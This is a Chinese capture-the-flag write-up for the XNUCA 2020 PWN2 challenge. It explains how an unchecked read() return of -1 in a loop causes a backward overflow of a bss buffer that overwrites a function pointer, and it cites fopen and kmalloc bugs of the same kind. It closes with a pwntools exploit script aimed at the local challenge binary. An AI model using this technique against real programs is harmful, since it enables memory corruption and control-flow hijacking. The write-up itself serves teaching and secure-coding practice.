#  XNUCA 2020  PWN2 WP



这道题的场景和qwb2020  unicoder的第一部分完全一样，甚至简单一点，因为少了个类型混淆。 Unicoder 原题是这么写的(PWN2的时候我把这部分去掉了)：

```
(int)v2 = get_num();
if(v2<=0 || (char)v2 >31);
```

然后接下来Unicoder 和PWN2这道题都是一样的代码：

```c
v1 = 0;
v2 = length;
do
{
    if(v1 >= v2)   break;
    v1 +=  read(0, &buf[v1], v2-v1); //buf in bss section
} while(buf[length-1]!='/n')
```

buf是bss段上的缓冲区。

问题在哪？

还记得网鼎杯2018有一个题，场景大概是：

```c
void func(){
    FILE *fp = fopen(secret_file ,'w+');
    memset(secret, 0, sizeof(secret));
    fread(secret, 1, length, fp);
    memcmp(secret, your_input);
    if( !memcmp(secret, your_input)){
        you_can_get_shell;
    }
}
```

这里的问题在于， 文件打开之后是没有close， 而一个进程的资源有限的 ，默认（可以用ulimit设置）只能打开1024个文件，于是重复调用 func 1022次之后，fopen函数返回-1, 那么fread 是一个无限的调用，且不会造成进程的crash。 于是secret就是空字符串， 于是这道题就解了。

还有就是经典的出题人自己写的内核， 然后出成内核题：

```c
(char *) a = (char *)kmalloc(1024);
then you can write anything to address a.
```

经典kmalloc实现有问题， 可以返回 0，而此时内核code段的地址是0。 （印象中2018年到2019年碰到了几次，包括2019 defcon quals）。 

归类这类问题， 对于敏感句柄（资源）的使用，必须检查申请资源的函数返回值是否合理！！！！！

```
//fopen和open检查其返回值， malloc和kmalloc检查其返回值 
//一个进程的内存有限
//无限的 (char *) a = (char *)malloc(1024); 会使得 a =-1;
```

那么对于read函数同样：

```
(int)a  = read(0, &bss_buf, length); 
```

bss_buf 是有长度限制的， 如果length >  bss_end - &bss_buf 会怎么样?    答案是a = -1。

于是

```c
v1 +=  read(0, &buf[v1], v2-v1); //buf in bss section
```

这句话，就会导致 v1 += -1， 于是导致了缓冲区前溢。于是令 v2 =  bss_end  - v1 + 4 , 可以往前推移4个字节（32位）的偏移，可以覆盖写函数指针。

当时qwb的时候读了100遍以上的题目审到了这个洞，但还是差了5分钟没能拿到这个题的一解， 膜Unicoder f61d的出题师傅。 但思路还是特别好的，让我知道，以后写代码记得：

```c
if( read(0,buf,1024) <=0)    printf("gg\n");
```



另外，还有一个有趣的现象，read这样的行为， 在动态链接和静态链接的行为是不一致的。静态链接不会出现上述问题。有兴趣的师傅可以去细究其中原因。

POC：

```python
#coding:utf-8
from pwn import *
import os 

context.arch="i386"
context.log_level='debug'

io=process("./pwn2")

io.recvuntil("again\n")
io.sendline('a'*4)

io.recvuntil("> ")
io.sendline('1')

io.recvuntil('path: ')
io.sendline('a')

io.recvuntil('length: ')
io.sendline(str(0xe80-4)) 

io.recvuntil("Digest: ")
io.send(b'will'+b'a'*(0xe80-8)) #忘了这个偏移是否有变，题目改了几次

io.interactive()
```



